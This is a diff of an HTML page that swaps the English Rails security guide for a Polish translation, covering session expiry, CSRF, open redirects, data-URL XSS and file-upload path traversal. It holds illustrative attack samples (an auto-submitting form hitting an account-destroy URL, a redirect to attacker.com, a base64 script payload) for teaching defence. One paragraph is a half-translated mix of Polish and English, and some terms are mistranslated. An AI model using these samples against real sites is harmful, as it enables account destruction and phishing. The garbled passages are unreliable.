@@ -51,77 +51,71 @@
             
               <li><a href="#_sposoby_obrony_przed_atakiem_typu_session_fixation">Sposoby obrony przed atakiem typu session fixation</a></li>
             
-              <li><a href="#_session_expiry">Session expiry</a></li>
+              <li><a href="#_wygasanie_sesji">Wygasanie sesji</a></li>
+            
+              <li><a href="#_sposoby_ochrony_przed_atakiem_typu_csrf">Sposoby ochrony przed atakiem typu CSRF</a></li>
             
             </ul>
           </li>
           <li>
-          <a href="#_cross_site_reference_forgery_csrf">Cross-Site Reference Forgery (CSRF)</a>
+          <a href="#_przekierowania_i_pliki">Przekierowania i pliki</a>
             <ul>
             
-              <li><a href="#_csrf_countermeasures">CSRF Countermeasures</a></li>
+              <li><a href="#_przekierowania">Przekierowania</a></li>
+            
+              <li><a href="#_wysy_anie_upload_plik_w">Wysyłanie (upload) plików</a></li>
+            
+              <li><a href="#_wykonywalny_kod_we_wczytywanych_plikach">Wykonywalny kod we wczytywanych plikach</a></li>
+            
+              <li><a href="#_ci_ganie_plik_w">Ściąganie plików</a></li>
             
             </ul>
           </li>
           <li>
-          <a href="#_redirection_and_files">Redirection and Files</a>
+          <a href="#_ochrona_intranetu_i_nardz_dzi_administracyjnych">Ochrona Intranetu I nardzędzi administracyjnych</a>
             <ul>
             
-              <li><a href="#_redirection">Redirection</a></li>
-            
-              <li><a href="#_file_uploads">File uploads</a></li>
-            
-              <li><a href="#_executable_code_in_file_uploads">Executable code in file uploads</a></li>
-            
-              <li><a href="#_file_downloads">File downloads</a></li>
+              <li><a href="#_dodatkowe_rodki_ostro_no_ci">Dodatkowe środki ostrożności</a></li>
             
             </ul>
           </li>
           <li>
-          <a href="#_intranet_and_admin_security">Intranet and Admin security</a>
+          <a href="#_masowe_przypisanie">Masowe przypisanie</a>
             <ul>
             
-              <li><a href="#_additional_precautions">Additional precautions</a></li>
+              <li><a href="#_sposoby_ochrony">Sposoby ochrony</a></li>
             
             </ul>
           </li>
           <li>
-          <a href="#_mass_assignment">Mass assignment</a>
+          <a href="#_zarz_dzanie_u_ytkownikami">Zarządzanie użytkownikami</a>
             <ul>
             
-              <li><a href="#_countermeasures">Countermeasures</a></li>
+              <li><a href="#_ataki_typu_brute_force_na_konta_u_ytkownik_w">Ataki typu brute-force na konta użytkowników</a></li>
+            
+              <li><a href="#_przej_cie_konta_u_ytkownika">Przejęcie konta użytkownika</a></li>
+            
+              <li><a href="#_captcha">CAPTCHA</a></li>
+            
+              <li><a href="#_logowanie">Logowanie</a></li>
+            
+              <li><a href="#_dobre_has_a">Dobre hasła</a></li>
+            
+              <li><a href="#_wyra_enia_regularne">Wyrażenia regularne</a></li>
+            
+              <li><a href="#_eskalacja_przywilej_w">Eskalacja przywilejów</a></li>
             
             </ul>
           </li>
           <li>
-          <a href="#_user_management">User management</a>
+          <a href="#_atak_typu_injection">Atak typu Injection</a>
             <ul>
             
-              <li><a href="#_brute_forcing_accounts">Brute-forcing accounts</a></li>
+              <li><a href="#_bia_e_listy_vs_czarne_listy">Białe listy vs Czarne listy</a></li>
             
-              <li><a href="#_account_hijacking">Account hijacking</a></li>
+              <li><a href="#_atak_typu_sql_injection">Atak typu SQL Injection</a></li>
             
-              <li><a href="#_captchas">CAPTCHAs</a></li>
-            
-              <li><a href="#_logging">Logging</a></li>
-            
-              <li><a href="#_good_passwords">Good passwords</a></li>
-            
-              <li><a href="#_regular_expressions">Regular expressions</a></li>
-            
-              <li><a href="#_privilege_escalation">Privilege escalation</a></li>
-            
-            </ul>
-          </li>
-          <li>
-          <a href="#_injection">Injection</a>
-            <ul>
-            
-              <li><a href="#_whitelists_versus_blacklists">Whitelists versus Blacklists</a></li>
-            
-              <li><a href="#_sql_injection">SQL Injection</a></li>
-            
-              <li><a href="#_cross_site_scripting_xss">Cross-Site Scripting (XSS)</a></li>
+              <li><a href="#_atak_cross_site_scripting_xss">Atak Cross-Site Scripting (XSS)</a></li>
             
               <li><a href="#_css_injection">CSS Injection</a></li>
             
@@ -368,9 +362,9 @@ http://www.gnu.org/software/src-highlite -->
 <pre><tt>reset_session</tt></pre></div></div>
 <div class="paragraph"><p>W przypadku korzystania z popularnej wtyczki RestfulAuthentication do zarządzania użytkownikami, należy dodać reset_session do akcji SessionsController#create. Zwróć uwagę, że ta akcja usuwa wszystkie wartości z sesji, <span style="background-color: #fffcdb;"> więc musisz przenieść je do nowej sesji</span>.</p></div>
 <div class="paragraph"><p>Innym sposobem obrony jest <span style="background-color: #fffcdb;">zapisywanie specyficznych właściwości użytkownika w sesji</span>, weryfikowanie ich przy każdym żądaniu i odmowa dostępu, jeśli informacje te nie pasują do siebie. Takimi właściwościami mogą być adres IP lub user agent (nazwa przeglądarki internetowej), choć ta ostatnia nie jest aż tak bardzo charakterystyczna dla użytkownika. Podczas zapisywania adresu IP, musisz pamiętać, że istnieją dostawcy usług internetowych oraz duże organizacje, które oferują swoim użytkownikom dostęp do Internetu przez proxy. <span style="background-color: #fffcdb;"> Adresy IP tych użytkowników mogą ulegać zmianom w trakcie sesji</span>, więc nie będą oni mogli korzystać z aplikacji, lub tylko w ograniczonym zakresie.</p></div>
-<h3 id="_session_expiry">2.8. Session expiry</h3>
-<div class="paragraph"><p>-- <em>Sessions that never expire extend the time-frame for attacks such as cross-site reference forgery (CSRF), session hijacking and session fixation.</em></p></div>
-<div class="paragraph"><p>One possibility is to set the expiry time-stamp of the cookie with the session id. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to <span style="background-color: #fffcdb;">expire sessions in a database table</span>. Call Session.sweep("20m") to expire sessions that were used longer than 20 minutes ago.</p></div>
+<h3 id="_wygasanie_sesji">2.8. Wygasanie sesji</h3>
+<div class="paragraph"><p><em>Sesja, która nigdy nie wygasa daje więcej czasu atakującym na przeprowadzenie ataku typu cross-site reference forgery (CSRF), przechwytywanie sesji i session fixation.</em></p></div>
+<div class="paragraph"><p>Jedną z możliwości jest ustawienie czasu wygaśnięcia cookie przechowującego id sesji. Jednak klient może edytować pliki cookies, które są przechowywane w przeglądarce internetowej tak, żeby wygasające sesje na serwerze były bezpieczniejsze. Oto przykład, jak <span style="background-color: #fffcdb;">ustawić wygasanie sesji w tabeli bazy danych</span>. Session.sweep(„20m”) powoduje wygaśnięcie sesji, które były używane wcześniej niż 20 minut temu.</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -387,27 +381,24 @@ http://www.gnu.org/software/src-highlite -->
      <span style="font-weight: bold"><span style="color: #0000FF">self</span></span><span style="color: #990000">.</span>delete_all <span style="color: #FF0000">"updated_at &lt; '#{time.to_s(:db)}'"</span>
    <span style="font-weight: bold"><span style="color: #0000FF">end</span></span>
  <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
-<div class="paragraph"><p>The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a created_at column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:</p></div>
+<div class="paragraph"><p>W Sekcji na temat ataku typu session fixation zapoznaliśmy się problemem utrzymania sesji. Atakujący odświeżając sesję co pięć minut jest w stanie bez końca utrzymywać sesję przy życiu, mimo tego, że sesja użytkownika już wygasła. Prostym rozwiązaniem tego problemu może być dodanie kolumny created_at do tabeli sesji. W ten sposób możesz usunąć sesje, które zostały stworzone dawno temu. Dodaj tą linię kodu, do metody, która opisałem powyżej:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
 http://www.lorenzobettini.it
 http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="font-weight: bold"><span style="color: #0000FF">self</span></span><span style="color: #990000">.</span>delete_all <span style="color: #FF0000">"updated_at &lt; '#{time.to_s(:db)}' OR created_at &lt; '#{2.days.ago.to_s(:db)}'"</span></tt></pre></div></div>
-</div>
-<h2 id="_cross_site_reference_forgery_csrf">3. Cross-Site Reference Forgery (CSRF)</h2>
-<div class="sectionbody">
-<div class="paragraph"><p>-- <em>This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.</em></p></div>
+<div class="paragraph"><p>-- <em>Ta metoda ataku dodaje złośliwy kod lub link na stronie internetowej, która jest odpowiedzialna za dostęp do aplikacji, w taki sposób że użytkownikowi wydaje się, że został uwierzytelniony. Jeśli sesja dla tej aplikacji nie wygasła, atakujący może bezprawnie wykonywać polecenia.</em></p></div>
 <div class="imageblock">
 <div class="content">
 <img src="images/csrf.png" alt="CSRF" title="CSRF"/>
 </div>
 </div>
-<div class="paragraph"><p>In the session chapter you have learned that most Rails applications use cookie-based sessions. Either they store the session id in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is, that it will also send the cookie, if the request comes from a site of a different domain. Let&#8217;s start with an example:</p></div>
+<div class="paragraph"><p>W rozdziale o sesjach dowiedzieliśmy się, że większość aplikacji Railsowych wykorzystuje sesje oparte na cookies. Każda z nich przechowuje identyfikator sesji w pliku cookie i hash sesji trzymaja po stronie serwera, lub też cały hash sesji przechowuje po stronie klienta. We wszystkich przypadkach przeglądarka, na każde żądanie, automatycznie przesyła dalej cookie do domeny, oczywiście jeśli może odnaleźć cookie dla danej domeny. Zagrożeniem może być fakt, że przeglądarka będzie również wysłać plik cookie, jeśli żądanie przyjdzie ze strony na innej domenie. Zacznijmy od przykładu:</p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob&#8217;s project management application, rather than an image file.
+Bob przegląda forum i widzi wpis (post) hakera, zawierający spreparowany element HTML typu img (obrazek). Element odnosi się raczej do komendy w aplikacji zarządzania projektem Boba, zamiast obrazka.
 </p>
 </li>
 <li>
@@ -417,64 +408,64 @@ Bob browses a message board and views a post from a hacker where there is a craf
 </li>
 <li>
 <p>
-Bob&#8217;s session at www.webapp.com is still alive, because he didn&#8217;t log out a few minutes ago.
+Sesja Bob na www.webapp.com jest wciąż aktywna, bo nie wylogował się kilka minut temu.
 </p>
 </li>
 <li>
 <p>
-By viewing the post, the browser finds an image tag. It tries to load the suspected image from www.webapp.com. As explained before, it will also send along the cookie with the valid session id.
+Poprzez oglądanie wpisu, przeglądarka znajdzie tag obrazka. Następnie spróbuje wczytać podejrzany obrazek z www.webapp.com. Zgodnie z tym, co napisałem wcześniej, przeglądarka prześle również cookie z ważnym identyfikator sesji.
 </p>
 </li>
 <li>
 <p>
-The web application at www.webapp.com verifies the user information in the corresponding session hash and destroys the project with the ID 1. It then returns a result page which is an unexpected result for the browser, so it will not display the image.
+Aplikacja internetowa na www.webapp.com sprawdzi informacje o użytkowniku w odpowiednim hashu sesji i zniszczy projekt z ID 1. Następnie zwróci stronę, która będzie nieoczekiwanym wynikiem dla przeglądarki, więc nie wyświetli się żaden obrazek.
 </p>
 </li>
 <li>
 <p>
-Bob doesn&#8217;t notice the attack&#8201;&#8212;&#8201;but a few days later he finds out that project number one is gone.
+Bob nie zauważy ataku&#8201;&#8212;&#8201;ale po kilku dniach stwierdzi, że projekt numer 1 zniknał.
 </p>
 </li>
 </ul></div>
-<div class="paragraph"><p>It is important to notice that the actual crafted image or link doesn&#8217;t necessarily have to be situated in the web application&#8217;s domain, it can be anywhere – in a forum, blog post or email.</p></div>
-<div class="paragraph"><p>CSRF appears very rarely in CVE (Common Vulnerabilities and Exposures)&#8201;&#8212;&#8201;less than 0.1% in 2006&#8201;&#8212;&#8201;but it really is a <em>sleeping giant</em> [Grossman]. This is in stark contrast to the results in my (and others) security contract work – <span style="background-color: #fffcdb;">CSRF is an important security issue</span>.</p></div>
-<h3 id="_csrf_countermeasures">3.1. CSRF Countermeasures</h3>
-<div class="paragraph"><p>-- <em>First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF.</em></p></div>
-<div class="paragraph"><p>The HTTP protocol basically provides two main types of requests - GET and POST (and more, but they are not supported by most browsers). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:</p></div>
-<div class="paragraph"><p><strong>Use GET if:</strong></p></div>
+<div class="paragraph"><p>Ważne jest, aby zauważyć, że spreparowany obrazek lub link nie koniecznie musi znajdować się na domenie, gdzie znajduje się aplikacja - może być w dowolnym miejscu - na forum, blogu lub w mailu.</p></div>
+<div class="paragraph"><p>CSRF pojawia się bardzo rzadko w CVE (Common Vulnerabilities and Exposures)&#8201;&#8212;&#8201;mniej niż 0,1% w 2006 r.&#8201;&#8212;&#8201;ale tak naprawdę jest to "śpiący olbrzym" [Grossman]. Kontrastuje to znacząco z wynikami moich (i innych) zleceń dotyczących pracy z bezpieczeństwem - <span style="background-color: #fffcdb;">CSRF jest ważną kwestią bezpieczeństwa</span>.</p></div>
+<h3 id="_sposoby_ochrony_przed_atakiem_typu_csrf">2.9. Sposoby ochrony przed atakiem typu CSRF</h3>
+<div class="paragraph"><p>-- _Po pierwsze, jak to jest wymagane przez W3C, używaj odpowiednio GET i POST. Po drugie, używaj tokena zabezpieczającego przy metodach non-GET, żeby chronić aplikację przed CSRF.</p></div>
+<div class="paragraph"><p>Protokół HTTP przewiduje zasadniczo dwa główne rodzaje wniosków - GET i POST (i więcej, ale nie są one obsługiwane przez większość przeglądarek). World Wide Web Consortium (W3C) podaje spis sytuacji, w których stosujemy GET lub POST:</p></div>
+<div class="paragraph"><p><strong>Używaj GET jeśli:</strong></p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-The interaction is more <span style="background-color: #fffcdb;">like a question</span> (i.e., it is a safe operation such as a query, read operation, or lookup).
+Interakcja przypomina <span style="background-color: #fffcdb;">zapytanie</span> (np. jeśli jest to bezpieczna operacja taka jak kwerenda (query), operacja czytania (read operation), albo wyszukiwania (lookup).
 </p>
 </li>
 </ul></div>
-<div class="paragraph"><p><strong>Use POST if:</strong></p></div>
+<div class="paragraph"><p><strong>Używaj  POST jeśli:</strong></p></div>
 <div class="ulist"><ul>
 <li>
 <p>
-The interaction is more <span style="background-color: #fffcdb;">like an order</span>, or
+Interakcja przypomina <span style="background-color: #fffcdb;">komendę</span>, lub
 </p>
 </li>
 <li>
 <p>
-The interaction <span style="background-color: #fffcdb;">changes the state</span> of the resource in a way that the user would perceive (e.g., a subscription to a service), or
+Interakcja <span style="background-color: #fffcdb;">powoduje zmianę</span> zasobów w sposób zauważalny dla użytkownika (np. subskrypcja serwisu), lub
 </p>
 </li>
 <li>
 <p>
-The user is <span style="background-color: #fffcdb;">held accountable for the results</span> of the interaction.
+Użytkownik <span style="background-color: #fffcdb;">jest odpowiedzialny za wynik działania</span> interakcji.
 </p>
 </li>
 </ul></div>
-<div class="paragraph"><p>If your web application is RESTful, you might be used to additional HTTP verbs, such as PUT or DELETE. Most of today‘s web browsers, however do not support them - only GET and POST. Rails uses a hidden <tt>_method</tt> field to handle this barrier.</p></div>
-<div class="paragraph"><p><span style="background-color: #fffcdb;">The verify method in a controller can make sure that specific actions may not be used over GET</span>. Here is an example to verify the use of the transfer action over POST. If the action comes in using any other verb, it redirects to the list action.</p></div>
+<div class="paragraph"><p>Jeśli aplikacja internetowa jest RESTful, możesz również korzystać z dodatkowych  metod HTTP, takich jak PUT lub DELETE. Większość współczesnych przeglądarek internetowych ich nie obsługuje, jednak Railsy wykorzystują ukryte pole <tt>_method</tt>, żeby ominąć tą barierę.</p></div>
+<div class="paragraph"><p><span style="background-color: #fffcdb;">Sprawdzanie metody (verify method) w kontrolerze sprawdza czy konkretne akcje nie mogą być wykorzystywane przez GET</span>. Oto przykład, w którym sprawdzane jest wykorzystanie akcji transferu przez POST. Jeżeli akcja jakiejkolwiek innej metody HTTP, zostaje ona przekierowana do listy akcji.</p></div>
 <div class="literalblock">
 <div class="content">
 <pre><tt>verify :method =&gt; :post, :only =&gt; [:transfer], :redirect_to =&gt; {:action =&gt; :list}</tt></pre>
 </div></div>
-<div class="paragraph"><p>With this precaution, the attack from above will not work, because the browser sends a GET request for images, which will not be accepted by the web application.</p></div>
-<div class="paragraph"><p>But this was only the first step, because <span style="background-color: #fffcdb;">POST requests can be send automatically, too</span>. Here is an example for a link which displays www.harmless.com as destination in the browser&#8217;s status bar. In fact it dynamically creates a new form that sends a POST request.</p></div>
+<div class="paragraph"><p>Dzięki tej ostrożności, wyżej opisany atak nie zadziała, ponieważ przeglądarka wysyła żądanie GET dla obrazków, które nie zostanie zaakceptowane przez aplikację internetową.</p></div>
+<div class="paragraph"><p>Ale to dopiero pierwszy krok, ponieważ <span style="background-color: #fffcdb;">żądanie POST również może być wysłane automatycznie</span>. Oto przykład linku, który wyświetla www.harmless.com jako miejsce docelowe w pasku statusu przeglądarki. W rzeczywistości to dynamicznie tworzy nowy formularz, który wysyła żądanie POST.</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -488,19 +479,20 @@ http://www.gnu.org/software/src-highlite -->
 <span style="color: #FF0000">  f.action = 'http://www.example.com/account/destroy';</span>
 <span style="color: #FF0000">  f.submit();</span>
 <span style="color: #FF0000">  return false;"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>To the harmless survey<span style="font-weight: bold"><span style="color: #0000FF">&lt;/a&gt;</span></span></tt></pre></div></div>
-<div class="paragraph"><p>Or the attacker places the code into the onmouseover event handler of an image:</p></div>
+<div class="paragraph"><p>Atakujący może też umieścić kod w zdarzeniu onmouseover dla obrazka:</p></div>
 <div class="paragraph"><p><tt>&lt;img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." /&gt;</tt></p></div>
-<div class="paragraph"><p>There are many other possibilities, including Ajax to attack the victim in the background. The  <span style="background-color: #fffcdb;">solution to this is including a security token in non-GET requests</span> which check on the server-side. In Rails 2 or higher, this is a one-liner in the application controller:</p></div>
+<div class="paragraph"><p>Istnieje wiele innych możliwości (w tym Ajax) ataku ofiary w tle.  <span style="background-color: #fffcdb;">Rozwiązaniem tego problemu może być użycie tokena zabezpieczającego w żądaniach typu non-GET</span> sprawdzanego po stronie serwera. W Rails 2 lub wyższym, jest to jedna linia kodu w kontrolerze aplikacji:</p></div>
 <div class="paragraph"><p><tt>protect_from_forgery :secret =&gt; "123456789012345678901234567890..."</tt></p></div>
-<div class="paragraph"><p>This will automatically include a security token, calculated from the current session and the server-side secret, in all forms and Ajax requests generated by Rails. You won&#8217;t need the secret, if you use CookieStorage as session storage. It will raise an ActionController::InvalidAuthenticityToken error, if the security token doesn&#8217;t match what was expected.</p></div>
-<div class="paragraph"><p>Note that <span style="background-color: #fffcdb;">cross-site scripting (XSS) vulnerabilities bypass all CSRF protections</span>. XSS gives the attacker access to all elements on a page, so he can read the CSRF security token from a form or directly submit the form. Read more about XSS later.</p></div>
+<div class="paragraph"><p>Spowoduje to automatyczne dołączenie zabezpieczenia tokena, wyliczonego na podstawie bieżącej sesji i tajnego klucza (secret), we wszystkich formularzach i żądaniach Ajaxowych generowanych w Railsach. Klucz (secret) nie będzie potrzebny, jeśli używasz CookieStorage jako ze sposobu przechowywania sesji. Aplikacja wyrzuci błąd ActionController::InvalidAuthenticityToken jeśli token nie będzie poprawny.</p></div>
+<div class="paragraph"><p>Należy pamiętać, że <span style="background-color: #fffcdb;">atak typu cross-site scripting (XSS) omija wszystkie zabezpieczenia przed atakami typu CSRF</span>. XSS pozwala atakującemu na dostęp do wszystkich elementów na stronie, także może on odczytać token zabezpieczający przed CSRF z formularza lub bezpośrednio wysłać formularz. Więcej informacji o atakach typu XSS znajduje się w dalszej części podręcznika.</p></div>
 </div>
-<h2 id="_redirection_and_files">4. Redirection and Files</h2>
+<h2 id="_przekierowania_i_pliki">3. Przekierowania i pliki</h2>
 <div class="sectionbody">
-<div class="paragraph"><p>Another class of security vulnerabilities surrounds the use of redirection and files in web applications.</p></div>
-<h3 id="_redirection">4.1. Redirection</h3>
-<div class="paragraph"><p>-- <em>Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, he may also create a self-contained attack.</em></p></div>
-<div class="paragraph"><p>Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: <a href="http://www.example.com/site/redirect?to">http://www.example.com/site/redirect?to</a>= www.attacker.com. Here is an example of a legacy action:</p></div>
+<div class="paragraph"><p>Inną grupą elementów podatnych na atak są przekierowania i pliki w aplikacjach internetowych.</p></div>
+<h3 id="_przekierowania">3.1. Przekierowania</h3>
+<div class="paragraph"><p>-- <em>Przekierowanie w aplikacji internetowej to niedoceniane narzędzie krakingu: Atakujący może zarówno weprowadzić użytkownika na stronę-pułapkę, jak i przygotować niezależny atak.</em></p></div>
+<div class="paragraph"><p>Każdy przypadek, gdy użytkownik ma możliwość rozwinięcia linku (jego części) do przekierowania, stanowi prawdopodobne zagrożone. Najbardziej oczywisty atak to przekierowanie użytkowników do fałszywych stron, które wyglądają dokładnie jak oryginalne. Ten atak (typu phishing) działa poprzez wysłanie zwyczajnie wyglądających linków w wiadomości e-mai, injecting the link by XSS in the web application or umieszczanie linków do innych stron. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: <a href="http://www.example.com/site/redirect?to">http://www.example.com/site/redirect?to</a>= www.attacker.com. Here is an example of a legacy action:</p></div>
+<div class="paragraph"><p>Nie wygląda to podejrzanie, ponieważ URL zaczyna się jak link do zwyczajnej, niegroźnej strony internetowej, a URL do strony, z której płynie zagrożenie, jest ukryty w parametrze przekierowania: <a href="http://www.example.com/site/redirect?to">http://www.example.com/site/redirect?to</a>= www.attacker.com. Oto przykład akcji dziedziczenia (legacy action):</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -509,17 +501,17 @@ http://www.gnu.org/software/src-highlite -->
 <pre><tt><span style="font-weight: bold"><span style="color: #0000FF">def</span></span> legacy
   redirect_to<span style="color: #990000">(</span>params<span style="color: #990000">.</span>update<span style="color: #990000">(:</span>action<span style="color: #990000">=&gt;</span><span style="color: #FF0000">'main'</span><span style="color: #990000">))</span>
 <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
-<div class="paragraph"><p>This will redirect the user to the main action if he tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can exploited by an attacker if he includes a host key in the URL:</p></div>
+<div class="paragraph"><p>Będzie ona przekierowywać użytkownika do głównej akcji, jeśli próbował uzyskać dostęp do akcji dziedziczenia. Naszym zamiarem było zabezpieczenie parametrów w adresach URL w akcji dziedziczenia i przekazanie ich do głównej akcji. Jednakże może to być wykorzystane przez atakującego, jeśli zawrze on klucz hosta adresie URL:</p></div>
 <div class="paragraph"><p><tt>http://www.example.com/site/legacy?param1=xy&amp;param2=23&amp;host=www.attacker.com</tt></p></div>
-<div class="paragraph"><p>If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to <span style="background-color: #fffcdb;">include only the expected parameters in a legacy action</span> (again a whitelist approach, as opposed to removing unexpected parameters). <span style="background-color: #fffcdb;">And if you redirect to an URL, check it with a whitelist or a regular expression</span>.</p></div>
-<h4 id="_self_contained_xss">4.1.1. Self-contained XSS</h4>
-<div class="paragraph"><p>Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:</p></div>
+<div class="paragraph"><p>Jeśli jest on na końcu adresu URL, ciężko go zauważyć i przekierowuje użytkownika do hosta attacker.com. Prostą ochroną byłoby <span style="color: #;background-color: fffcdb;">zawieranie tylko oczekiwanych parametrów akcji dziedziczenia</span> (biała lista (whitelist) uchodzi za alternatywę dla usuwania nieoczekiwanych parametrów). <span style="color: #;background-color: fffcdb;">Każde przekierowanie do adresu URL, należy sprawdzać z białą listą lub dozwolonymi wyrażeniami regularnymi</span>.</p></div>
+<h4 id="_niezale_ny_atak_typu_xss">3.1.1. Niezależny atak typu XSS</h4>
+<div class="paragraph"><p>Kolejnymi atakami są przekierowywania i niezależny atak XSS działające w przeglądarkach Firefox i Opera przez wykorzystanie protokołu danych. Protokół ten wyświetla swoją zawartość bezpośrednio w przeglądarce i może mieć postać wszystkiego - od kodu HTML lub JavaScript do całego zdjęcia:</p></div>
 <div class="paragraph"><p><tt>data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</tt></p></div>
-<div class="paragraph"><p>This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, <span style="background-color: #fffcdb;">do not allow the user to supply (parts of) the URL to be redirected to</span>.</p></div>
-<h3 id="_file_uploads">4.2. File uploads</h3>
-<div class="paragraph"><p>-- <em>Make sure file uploads don&#8217;t overwrite important files, and process media files asynchronously.</em></p></div>
-<div class="paragraph"><p>Many web applications allow users to upload files. <span style="background-color: #fffcdb;">File names, which the user may choose (partly), should always be filtered</span> as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like “../../../etc/passwd”, it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so – one more reason to run web servers, database servers and other programs as a less privileged Unix user.</p></div>
-<div class="paragraph"><p>When filtering user input file names, <span style="background-color: #fffcdb;">don&#8217;t try to remove malicious parts</span>. Think of a situation where the web application removes all “../” in a file name and an attacker uses a string such as “....//” - the result will be “../”. It is best to use a whitelist approach, which <span style="background-color: #fffcdb;">checks for the validity of a file name with a set of accepted characters</span>. This is opposed to a blacklist approach which attempts to remove not allowed characters. In case it isn&#8217;t a valid file name, reject it (or replace not accepted characters), but don&#8217;t remove them. Here is the file name sanitizer from the <a href="http://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p></div>
+<div class="paragraph"><p>W tym przykładzie został użyty zaszyfrowany, metodą Base64, kod JavaScript, który wyświetla proste okno dialogowe. W przekierowaniu URL, atakujący może przekierować użytkownika na adres URL ze złośliwym kodem. Żeby bronić się przed takimi atakami, <span style="color: #;background-color: fffcdb;">nie powinieneś pozwalać użytkownikowi na przekierowania (części) adresu URL</span>.</p></div>
+<h3 id="_wysy_anie_upload_plik_w">3.2. Wysyłanie (upload) plików</h3>
+<div class="paragraph"><p>-- <em>Upewnij się, że pliki wysyłane na serwer nie nadpiszą ważnych plików i że są one przetwarzane asynchronicznie.</em></p></div>
+<div class="paragraph"><p>Wiele aplikacji internetowych pozwala użytkownikowi na wysyłanie własnych plików. <span style="background-color: #fffcdb;">Nazwy plików, które wybierze użytkownik zawsze powinny być filtrowane</span> ponieważ atakujący może użyć złośliwych nazw plików, żeby nadpisać ważne pliki na serwerze. Jeśli przechowujesz wczytane pliki w katalogu /var/www/uploads i jeśli użytkownik wyśle plik o nazwie „../../../etc/passwd”, może nadpisać któryś z ważnych plików. Oczywiście interpreter Ruby wymaga odpowiednich praw, żeby to zrobić – kolejny powód, żeby odpalać serwery, serwery baz danych i inne programy jako mniej uprzywilejowany użytkownik Unixowy.</p></div>
+<div class="paragraph"><p>Gdy filtrujesz pliki nadesłane przez użytkownika, <span style="background-color: #fffcdb;">nie staraj się usunąć złośliwych części</span>. Pomyśl o sytuacji, gdy aplikacja internetowa usuwa wszystkie “../” w nazwie pliku, a atakujący użyje takiej nazwy: “....//” – rezultat będzie taki: “../”. Najlepszym rozwiązaniem będzie stworzenie białej listy, dzięki której <span style="background-color: #fffcdb;"> będzie można sprawdzić czy nazwa pliku zawiera dozwolone znaki</span>. Jest to alternatywa dla czarnej listy, która ma za zadanie usuwać niedozwolone znaki. W przypadku, gdy nazwa jest niepoprawna odrzuć ją (lub zastąp niedozwolone znaki), ale nie usuwaj jej. Pod tym likniem znajdziesz przydatne narzędzie do obsługi nazw plików: <a href="http://github.com/technoweenie/attachment_fu/tree/master">attachment_fu plugin</a>:</p></div>
 <div class="listingblock">
 <div class="content"><!-- Generator: GNU source-highlight 2.11
 by Lorenzo Bettini
@@ -535,22 +527,22 @@ http://www.gnu.org/software/src-highlite -->
     name<span style="color: #990000">.</span>gsub! <span style="color: #FF6600">/[^\w\.\-]/</span><span style="color: #990000">,</span> <span style="color: #FF0000">'_'</span>
   <span style="font-weight: bold"><span style="color: #0000FF">end</span></span>
 <span style="font-weight: bold"><span style="color: #0000FF">end</span></span></tt></pre></div></div>
-<div class="paragraph"><p>A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its <span style="background-color: #fffcdb;">vulnerability to denial-of-service attacks</span>. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.</p></div>
-<div class="paragraph"><p>The solution to this, is best to <span style="background-color: #fffcdb;">process media files asynchronously</span>: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.</p></div>
-<h3 id="_executable_code_in_file_uploads">4.3. Executable code in file uploads</h3>
-<div class="paragraph"><p>-- <em>Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails /public directory if it is Apache&#8217;s home directory.</em></p></div>
-<div class="paragraph"><p>The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file “file.cgi” with code in it, which will be executed when someone downloads the file.</p></div>
